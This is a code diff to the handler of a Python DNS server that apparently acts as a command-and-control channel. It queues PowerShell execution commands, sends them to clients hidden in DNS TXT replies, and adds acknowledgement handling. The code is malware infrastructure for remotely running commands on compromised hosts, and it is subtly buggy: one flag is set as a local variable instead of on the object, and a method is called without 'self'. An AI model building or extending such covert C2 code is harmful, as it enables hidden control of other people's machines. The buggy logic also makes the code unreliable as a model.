@@ -17,7 +17,8 @@ class IndividualClientHandler(BaseRequestHandler):
         self.ip = client_address[0]
         self.active = False
         self.record_type = "TXT"
-        self.last_request_id = None
+        self.latest_request_id = None
+        self.latest_request_confirmed = False
         self.queued_commands = [("POWERSHELL_EXECUTE", "ls")]
         self.sent_commands = []
     
@@ -29,10 +30,15 @@ class IndividualClientHandler(BaseRequestHandler):
         data = self.get_data()
         request = dnslib.DNSRecord.parse(data)
         # Check IDs for repeat numbers, ignore if processed
-        if not self.last_request_id == request.header.id:
+        if not self.latest_request_id == request.header.id:
             print(request)
-            self.last_request_id = request.header.id
-            self.send_cmd(request)
+            if request.header.get_opcode() == 0:
+                self.latest_request_id = request.header.id
+                latest_request_confirmed = False
+                self.send_cmd(request)
+            elif request.header.get_opcode() == 5:
+                print("ack sent")
+                send_ack(request)
 
     def get_data(self):
         return self.request[0].strip()
@@ -41,6 +47,11 @@ class IndividualClientHandler(BaseRequestHandler):
     """ Provenance Specific Functions"""
     def queue_cmd(self, type, cmd):
         self.queued_commands.append((command_type[type], cmd))
+
+    def send_ack(self, request):
+        ack = request.reply()
+        socket = self.request[1]
+        socket.sendto(ack.pack(), self.client_address)
 
     def send_cmd(self, request):
         RR = {
@@ -73,7 +84,6 @@ class IndividualClientHandler(BaseRequestHandler):
         # send command
         socket = self.request[1]
         print(f"[INFO] Sending command to {self.client_address}")
-        print(f"{command_packet.pack()}")
         socket.sendto(command_packet.pack(), self.client_address)
         self.sent_commands.append((request.header.id,cmd))
 
